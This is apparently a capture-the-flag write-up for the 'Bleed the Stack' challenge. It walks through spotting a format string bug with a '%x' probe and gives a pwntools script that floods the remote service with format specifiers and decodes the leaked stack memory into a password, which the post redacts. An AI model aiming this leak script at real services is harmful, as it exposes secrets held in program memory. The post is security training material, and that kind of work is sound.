---
title: "Bleed the Stack"
description: "An amateur programmer decides that for his hello world program, he will echo whatever you say. Can you find his mistake?"
author: "0x0539"
date: "2023-05-16"
published: true
---

# bleed the stack

([challenge page](https://0x0539.net/play/fangorn/bleedthestack))

```
pls@RUBY ~ > nc challenges.0x0539.net 7070
ADVANCED CHALLENGE :: BLEED THE STACK
*****************************

Test me! Enter your name and I'll print it back to you!
```

i started off by sending `%x` as a test, which immediately leaked hex values, so the program is likely vulnerable to a [format string attack](https://owasp.org/www-community/attacks/Format_string_attack):

```
Test me! Enter your name and I'll print it back to you!
%x %x %x %x %x %x %x %x
40 f7f77620 1 0 1 20656854 73736170 64726f77
```

converting those hexadecimal values to ascii, we get the string `@÷÷v [f7f77620] ehTssapdrow` (`[f7f77620]` is invalid ascii). notably, `ehTssapdrow` is little-endian ordering of the ascii string `The password`.
we can build a python program with pwntools to send a tonne of '%x' strings, pad out bytearrays with fewer than 4 bytes, and finally flip each dword. noting that some bytearrays dont appear to have a valid ascii representation, such as `f7f77620`, we can handle any errors by just setting the .

```python
from pwn import *

context.log_level = 'CRITICAL'
host,port = 'challenges.0x0539.net', 7070
format_str = '%x ' * 299

def decode_bytes(dword):
    try:
        decoded = bytes.fromhex(dword).decode('ascii')[::-1] # convert LE to BE
        return ''.join([ch for ch in decoded if 32 <= ord(ch) <= 126])
    except UnicodeDecodeError: # dont bother converting if invalid ascii
        print(f'UnicodeDecodeError on bytearray \\'{dword}\\'.\\n')
        return(f' {dword} ')

def main():
    s = remote(host,port)
    s.recvuntil(b'you!\\n')
    s.sendline(format_str)

    raw_bytes = s.recvall().decode().strip()
    print(f'\\nbytearray:\\n{raw_bytes}\\n')
    dwords = raw_bytes.split(' ')
    dwords = [dword.zfill(8) for dword in dwords] # pad out values lower than 4 bytes
    decoded_dwords = ''.join([decode_bytes(dword) for dword in dwords])
    print(f'leaked:\\n{decoded_dwords}') # print result.
    return('quitting')

main()
```

so our output from this program gives the following LE bytearray:

```bytearray
40 f7f20620 1 0 1 20656854 73736170 64726f77 3a736920 6c5f4920 5f337630 6d723066 625f7434 733675 25207825 78252078 20782520 25207825 78252078 20782520 25207825
```

which the python script will convert to ascii:

```bash
@ f7f20620 The password is: [[redacted]] %x %x %x %x %x %x %x %x %x %
```


